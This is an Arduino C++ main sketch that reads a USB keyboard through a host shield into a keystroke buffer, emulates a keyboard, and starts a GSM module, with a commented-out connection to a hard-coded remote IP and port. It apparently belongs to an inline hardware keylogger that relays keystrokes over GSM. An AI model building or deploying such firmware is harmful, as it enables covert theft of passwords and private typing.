// ============================================================================
#include "./includes/core/controller.h"
// ============================================================================
SoftwareGSM *gsm_module;
// ============================================================================
USB usb;
// USBHub Hub(&usb);
HIDBoot<USB_HID_PROTOCOL_KEYBOARD> hid_keyboard(&usb);
KeyboardParser keyboard_prs;
// ============================================================================
void setup() {
	Serial.begin(DEFAULT_SERIAL_PORT);
	digitalWrite(DEFUALT_POWER_PIN, HIGH);

	Keyboard.begin();
	if (usb.Init() == -1) Serial.println(F("[ERROR] OSC did not start."));
	hid_keyboard.SetReportParser(0, &keyboard_prs);

	// while(!Serial);
	delay(1400);

	gsm_module = new SoftwareGSM();
	gsm_module->cfg();
	// gsm_module->connect_to_server(FF(F("194.87.111.222")), FF(F("8082")));

	Serial.println(F("[GSM] module started."));
	viewFreeMemory();

	keyboard_prs.buffer = "";
}
// ============================================================================
void loop() {
	ModulesControl::execute(gsm_module, &keyboard_prs);
	usb.Task();
}
// ============================================================================
